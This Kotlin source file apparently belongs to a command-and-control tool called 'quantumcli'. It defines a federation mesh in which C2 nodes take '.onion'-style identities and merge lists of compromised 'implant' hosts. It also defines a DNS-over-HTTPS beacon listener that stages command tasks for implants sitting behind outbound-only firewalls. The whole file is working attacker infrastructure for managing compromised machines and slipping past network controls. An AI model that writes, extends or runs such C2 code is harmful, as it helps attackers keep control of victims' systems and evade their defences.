package com.projectzerodays.quantumcli.c2

import com.projectzerodays.quantumcli.ops.Net
import fi.iki.elonen.NanoHTTPD
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.net.URLDecoder
import java.security.MessageDigest
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.ConcurrentHashMap

/**
 * FEDERATION — peer mesh state (Python spec parity: Federation class +
 * /federation/reg GET|POST and /federation/peer POST routes).
 *
 * Each C2 node owns an .onion-style identity derived from its persisted RSA
 * beacon keypair (stable across restarts) and stored at
 * logs/federation/onion.txt. Peer node registries merge implant lists into
 * the local registry via C2State.enroll; peer entries {id, url, ts} persist
 * to logs/federation/peers.json. These are HTTP endpoints the mesh calls —
 * no outbound network is performed here.
 */
object Federation {

    private val lock = Any()
    private val peerList = ArrayList<JSONObject>()

    @Volatile
    private var loaded = false

    private fun fedDir(): File = File(C2State.logDir, "federation").apply { mkdirs() }
    private fun idFile(): File = File(fedDir(), "onion.txt")
    private fun peersFile(): File = File(fedDir(), "peers.json")

    private fun now(): String =
        SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", Locale.US).format(Date())

    /** Node identity — sha256(persisted beacon RSA public key) prefix, persisted. */
    fun onion(): String {
        val f = idFile()
        val existing = if (f.isFile) f.readText().trim() else ""
        if (existing.isNotBlank()) return existing

        val pub = try {
            BeaconCrypto.ensureKeys().public.encoded
        } catch (e: Exception) {
            Net.randHex(8).toByteArray(Charsets.UTF_8)
        }
        val hex = MessageDigest.getInstance("SHA-256").digest(pub)
            .take(4).joinToString("") { "%02x".format(it) }
        val id = "qcli-$hex.onion"
        try {
            f.writeText(id)
        } catch (e: Exception) {
            // identity still valid in memory for this session
        }
        C2State.audit("FED", "identity reserved: $id")
        return id
    }

    /** {onion, registered} — identity card served on GET /federation/reg. */
    fun identity(): JSONObject = JSONObject()
        .put("onion", onion())
        .put("registered", peers().length())

    /** POST /federation/reg — merge a peer node's implant list into ours. */
    fun register(payload: JSONObject): JSONObject {
        val implants = payload.optJSONObject("implants") ?: JSONObject()
        var merged = 0
        val keys = implants.keys()
        while (keys.hasNext()) {
            val host = keys.next()
            val rec = implants.optJSONObject(host) ?: JSONObject()
            C2State.enroll(host, rec.optString("os").ifBlank { null })
            merged++
        }
        val peerId = payload.optString("onion").ifBlank { payload.optString("id") }.trim()
        if (peerId.isNotBlank()) {
            addPeer(JSONObject().put("id", peerId).put("url", payload.optString("url")))
        }
        C2State.audit("FED", "reg from ${peerId.ifBlank { "?" }}: $merged implant(s) merged")
        // response parity: {"implants": TURBINE.implants, "onion": FEDERATION.onion}
        val arr = JSONObject()
        C2State.implants.value.forEach { (h, info) ->
            arr.put(
                h,
                JSONObject()
                    .put("os", info.os ?: JSONObject.NULL)
                    .put("last_seen", info.lastSeen)
                    .put("beacons", info.beacons)
            )
        }
        return JSONObject().put("implants", arr).put("onion", onion())
    }

    /** POST /federation/peer — register/dedupe a peer node {id|onion, url}. */
    fun addPeer(peer: JSONObject): JSONObject {
        ensureLoaded()
        val id = peer.optString("id").ifBlank { peer.optString("onion") }.trim()
        if (id.isBlank()) {
            throw IllegalArgumentException("peer 'id' (or 'onion') required")
        }
        val url = peer.optString("url").trim()
        synchronized(lock) {
            val existing = peerList.firstOrNull { it.optString("id") == id }
            if (existing != null) {
                if (url.isNotBlank()) existing.put("url", url)
                existing.put("ts", now())
            } else {
                peerList.add(JSONObject().put("id", id).put("url", url).put("ts", now()))
            }
            persist()
        }
        C2State.audit("FED", "peer registered: $id")
        return JSONObject().put("peers", peers())
    }

    /** Peer list as persisted in peers.json. */
    fun peers(): JSONArray {
        ensureLoaded()
        synchronized(lock) { return JSONArray(peerList) }
    }

    private fun ensureLoaded() {
        if (loaded) return
        synchronized(lock) {
            if (loaded) return
            val f = peersFile()
            if (f.isFile) {
                try {
                    val arr = JSONArray(f.readText())
                    for (i in 0 until arr.length()) {
                        val o = arr.optJSONObject(i) ?: continue
                        if (o.optString("id").isNotBlank() &&
                            peerList.none { it.optString("id") == o.optString("id") }
                        ) {
                            peerList.add(o)
                        }
                    }
                } catch (e: Exception) {
                    // corrupt file -> start from an empty registry
                }
            }
            loaded = true
        }
    }

    private fun persist() {
        try {
            synchronized(lock) { peersFile().writeText(JSONArray(peerList).toString()) }
        } catch (e: Exception) {
            // best-effort persistence; in-memory registry remains authoritative
        }
    }
}

/**
 * DoH C2 beacon listener (Python DoHC2BeaconServer :5353 parity) — task
 * intake for implants behind outbound-only firewalls: the operator stages a
 * task under an opaque id via POST /t, publishes `?d=<id>` in a DNS TXT
 * record (doh_task_check parity), and implants fetch + pop it with
 * GET /?d=<id> — the response is a plain task dict ({act, cmd}), exactly
 * what a beacon pull returns.
 */
object DoHC2 {

    private var server: Listener? = null

    private val _running = MutableStateFlow(false)
    val running: StateFlow<Boolean> = _running.asStateFlow()

    @Volatile
    var boundPort: Int = 5353
        private set

    private val pending = ConcurrentHashMap<String, JSONObject>()

    fun start(port: Int = 5353): Boolean {
        stop()
        return try {
            val s = Listener(port)
            s.start(NanoHTTPD.SOCKET_READ_TIMEOUT, true)
            server = s
            boundPort = port
            _running.value = true
            C2State.audit("C2", "DoH beacon listener live on :$port (POST /t stages, GET /?d=<id> fetches)")
            true
        } catch (e: Exception) {
            C2State.audit("ERR", "DoH bind :$port failed — ${e.message}")
            false
        }
    }

    fun stop() {
        server?.stop()
        server = null
        if (_running.value) C2State.audit("C2", "DoH beacon listener stopped")
        _running.value = false
    }

    /** Stage a task under an opaque id (POST /t). Ids ride the DNS TXT record. */
    fun stageTask(task: JSONObject): String {
        val id = task.optString("id").ifBlank { Net.randHex(4) }
        pending[id] = JSONObject(task.toString()).put("id", id)
        C2State.audit("C2", "DoH task staged id=$id (pending ${pending.size})")
        return id
    }

    /** GET /?d=<id> — return and clear the staged task (task intake parity). */
    fun fetchTask(id: String): JSONObject? = pending.remove(id)

    fun status(): JSONObject = JSONObject()
        .put("running", _running.value)
        .put("port", boundPort)
        .put("pending", pending.size)

    private class Listener(port: Int) : NanoHTTPD(port) {

        override fun serve(session: IHTTPSession): Response {
            val uri = session.uri ?: "/"

            // POST /t {task | {...}} -> stage; returns the id to publish in TXT
            if (session.method == NanoHTTPD.Method.POST && uri == "/t") {
                val body = parseBody(session)
                val task = body.optJSONObject("task") ?: body
                return if (task.length() == 0) {
                    respond(Response.Status.BAD_REQUEST, "empty task")
                } else {
                    respond(
                        Response.Status.OK,
                        JSONObject().put("ok", true).put("id", stageTask(task)).toString()
                    )
                }
            }

            // GET /?d=<id> -> pop the staged task (implant fetch)
            if (session.method == NanoHTTPD.Method.GET) {
                val d = param(session, "d")
                if (!d.isNullOrBlank()) {
                    val task = fetchTask(d.trim())
                    C2State.audit(
                        "C2",
                        "DoH task fetch id=${d.take(24)} from ${session.remoteIpAddress} " +
                            "-> ${if (task != null) "delivered" else "miss"}"
                    )
                    return if (task != null) {
                        respond(Response.Status.OK, task.toString())
                    } else {
                        respond(
                            Response.Status.NOT_FOUND,
                            JSONObject().put("error", "no task for id").toString()
                        )
                    }
                }
            }

            return respond(Response.Status.OK, status().toString())
        }

        private fun param(session: IHTTPSession, name: String): String? {
            return session.queryParameterString.split("&")
                .firstOrNull { it.startsWith("$name=") }
                ?.substringAfter("=")
                ?.let { URLDecoder.decode(it, "UTF-8") }
        }

        private fun parseBody(session: IHTTPSession): JSONObject = try {
            val files = HashMap<String, String>()
            session.parseBody(files)
            val raw = files["postData"]
            if (raw.isNullOrBlank()) JSONObject() else JSONObject(raw)
        } catch (e: Exception) {
            JSONObject()
        }

        private fun respond(status: Response.Status, text: String): Response =
            newFixedLengthResponse(status, "application/json", text)
    }
}
